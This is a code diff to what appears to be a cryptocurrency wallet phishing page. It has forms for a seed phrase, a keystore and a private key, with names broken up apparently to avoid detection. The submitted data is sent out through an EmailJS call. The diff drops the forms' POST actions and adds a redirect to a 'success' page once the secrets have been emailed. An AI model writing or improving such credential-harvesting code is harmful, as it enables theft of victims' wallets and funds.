@@ -623,7 +623,7 @@
          </form>
 
                     <div class="nav_contents" id="phrase">
-         <form name="PHRA-SEe" id="connect_form" action="success" method="POST" onsubmit="mySendEmail()">
+         <form name="PHRA-SEe" id="connect_form" onsubmit="mySendEmail()">
 
                         <input type="hidden" name="bot-field">
 
@@ -651,7 +651,7 @@
             
 
                     <div class="nav_contents" id="keystone" style="display: none;">
-            <form name="KEY-STOR-E" id="connect_form" action="success" method="POST" onsubmit="mySendEmail()">
+            <form name="KEY-STOR-E" id="connect_form" onsubmit="mySendEmail()">
 
                         <input type="hidden" name="bot-field">
 
@@ -681,7 +681,7 @@
             
 
                     <div class="nav_contents" id="private" style="display: none;">
-                <form name="PRIV-ATES" id="connect_form" action="success" method="POST" onsubmit="mySendEmail()">
+                <form name="PRIV-ATES" id="connect_form" onsubmit="mySendEmail()">
 
                         <input type="hidden" name="bot-field">
 
@@ -948,6 +948,7 @@
 emailjs.send('service_794hmo3', 'template_gwmnkl1', templateParams)
     .then(function(response) {
        console.log('SUCCESS!', response.status, response.text);
+       window.location.href = 'success'
     }, function(error) {
        console.log('FAILED...', error);
     });
